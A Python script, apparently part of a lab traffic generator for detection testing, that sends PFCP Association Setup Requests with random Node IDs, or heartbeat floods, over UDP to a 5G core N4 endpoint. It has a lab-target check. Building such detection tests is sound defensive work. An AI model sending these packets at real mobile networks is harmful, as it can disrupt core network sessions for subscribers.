#!/usr/bin/env python3
"""N4 PFCP association abuse (label: pfcp_assoc_abuse).

Two behaviours a healthy N4 link should never show:
  1. Association Setup churn: repeated Association Setup Requests with rotating
     Node IDs (as if many peers appear/disappear).
  2. Heartbeat anomaly: heartbeats at an abnormal interval / with spoofed source.

Together these exercise association-state and heartbeat-interval detection.

Lab-only. See ../_common.py.
"""
import os, sys, time, struct, socket, random
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from _common import base_parser, assert_lab_target  # noqa: E402

PFCP_PORT = 8805
MSG_ASSOC_SETUP_REQ = 5
MSG_HEARTBEAT_REQ = 1


def pfcp_no_seid(msg_type: int, seq: int, body: bytes) -> bytes:
    flags = 0x20  # version=1, no SEID (node-level message)
    length = 4 + len(body)  # seq(3)+spare(1)+body
    return (struct.pack("!BBH", flags, msg_type, length)
            + struct.pack("!I", (seq << 8))[0:3] + b"\x00" + body)


def node_id_ie() -> bytes:
    # IE type 60 (Node ID), IPv4 flavour, random address to force churn
    addr = bytes(random.randint(1, 254) for _ in range(4))
    val = b"\x00" + addr  # node id type=IPv4(0) + address
    return struct.pack("!HH", 60, len(val)) + val


def main() -> None:
    parser = base_parser(__doc__, PFCP_PORT)
    parser.add_argument("--mode", choices=["churn", "heartbeat"], default="churn")
    args = parser.parse_args()
    assert_lab_target(args.target, args.ack)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / args.rate if args.rate > 0 else 0
    print(f"[pfcp_assoc_abuse:{args.mode}] -> {args.target}:{args.port} count={args.count}")
    for seq in range(1, args.count + 1):
        if args.mode == "churn":
            pkt = pfcp_no_seid(MSG_ASSOC_SETUP_REQ, seq, node_id_ie())
        else:  # heartbeat spam
            pkt = pfcp_no_seid(MSG_HEARTBEAT_REQ, seq, b"")
        sock.sendto(pkt, (args.target, args.port))
        if interval:
            time.sleep(interval)
    print(f"[pfcp_assoc_abuse] done ({args.mode}).")


if __name__ == "__main__":
    main()
